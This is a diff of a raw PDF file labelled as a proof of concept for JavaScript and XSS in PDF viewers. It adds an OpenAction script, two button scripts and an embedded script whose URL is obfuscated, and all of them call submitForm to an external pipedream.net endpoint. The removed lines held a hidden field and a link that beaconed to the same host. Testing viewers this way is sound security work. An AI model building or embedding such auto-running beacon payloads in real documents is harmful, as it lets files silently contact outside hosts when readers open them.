@@ -1,22 +1,22 @@
 %PDF-1.4
 1 0 obj
-<< /Type /Catalog /Pages 2 0 R /AcroForm << /Fields [10 0 R] >> >>
+<< /Type /Catalog /Pages 2 0 R /Names << /JavaScript 10 0 R >> /OpenAction << /S /JavaScript /JS (app.alert('PoC 3: XSS on Open!', 3);) >> >>
 endobj
 2 0 obj
 << /Type /Pages /Kids [3 0 R] /Count 1 >>
 endobj
 3 0 obj
-<< /Type /Page /Parent 2 0 R /MediaBox [0 0 612 792] /Contents 4 0 R /Resources 5 0 R /Annots [10 0 R 11 0 R] >>
+<< /Type /Page /Parent 2 0 R /MediaBox [0 0 612 792] /Contents 4 0 R /Resources 5 0 R /Annots [11 0 R 12 0 R] >>
 endobj
 4 0 obj
-<< /Length 65 >>
+<< /Length 75 >>
 stream
 BT
 /F1 12 Tf
 100 700 Td
-(PoC 2: Click the link to test XSS) Tj
+(PoC 3: Click buttons to test XSS) Tj
 100 650 Td
-(Link should be below) Tj
+(Two buttons should be below) Tj
 ET
 endstream
 endobj
@@ -30,13 +30,23 @@ endobj
 << /Type /FontDescriptor /FontName /Helvetica /Flags 32 /FontBBox [-166 -225 1000 931] /ItalicAngle 0 /Ascent 770 /Descent -230 /CapHeight 717 /StemV 88 >>
 endobj
 10 0 obj
-<< /Type /Annot /Subtype /Widget /FT /Tx /T (HiddenField) /V () /Rect [0 0 0 0] /A << /S /SubmitForm /F (https://eoy4evvlsf7y0jq.m.pipedream.net?poc2_hidden=1) /Flags 4 >> >>
+<< /Names [(EmbeddedJS) 13 0 R] >>
 endobj
 11 0 obj
-<< /Type /Annot /Subtype /Link /Rect [100 600 200 630] /BS << /W 1 /S /S >> /H /I /A << /S /JavaScript /JS (app.alert('PoC 2: XSS via Link!', 3); this.submitForm('https://eoy4evvlsf7y0jq.m.pipedream.net?poc2_link=1');) >> >>
+<< /Type /Annot /Subtype /Widget /FT /Btn /T (Button1) /Rect [100 600 200 630] /A << /S /JavaScript /JS (app.alert('PoC 3: Button 1 XSS!', 3); this.submitForm('https://eoy4evvlsf7y0jq.m.pipedream.net?poc3_btn1=1');) >> /AP << /N << /Type /XObject /Subtype /Form /BBox [0 0 100 30] /Resources << /Font << /F1 6 0 R >> >> /Length 50 >> stream BT /F1 12 Tf 10 15 Td (Button 1) Tj ET endstream >> >> >>
+endobj
+12 0 obj
+<< /Type /Annot /Subtype /Widget /FT /Btn /T (Button2) /Rect [100 570 200 600] /A << /S /JavaScript /JS (event.target.app.alert('PoC 3: Button 2 XSS!', 3); event.target.submitForm('https://eoy4evvlsf7y0jq.m.pipedream.net?poc3_btn2=1');) >> /AP << /N << /Type /XObject /Subtype /Form /BBox [0 0 100 30] /Resources << /Font << /F1 6 0 R >> >> /Length 50 >> stream BT /F1 12 Tf 10 15 Td (Button 2) Tj ET endstream >> >> >>
+endobj
+13 0 obj
+<< /S /JavaScript /JS (
+  var u = ['ht', 'tps', '://', 'eo', 'y4e', 'vvl', 'sf7', 'y0j', 'q.m', '.pi', 'ped', 'rea', 'm.n', 'et'].join('');
+  app.alert('PoC 3: Embedded JS XSS!', 3);
+  this.submitForm(u + '?poc3_embed=1');
+) >>
 endobj
 xref
-0 12
+0 14
 0000000000 65535 f 
 0000000010 00000 n 
 0000000095 00000 n 
@@ -49,8 +59,10 @@ xref
 0000000000 65535 f 
 0000000551 00000 n 
 0000000713 00000 n 
+0000000887 00000 n 
+0000001050 00000 n 
 trailer
-<< /Size 12 /Root 1 0 R >>
+<< /Size 14 /Root 1 0 R >>
 startxref
-850
+1200
 %%EOF
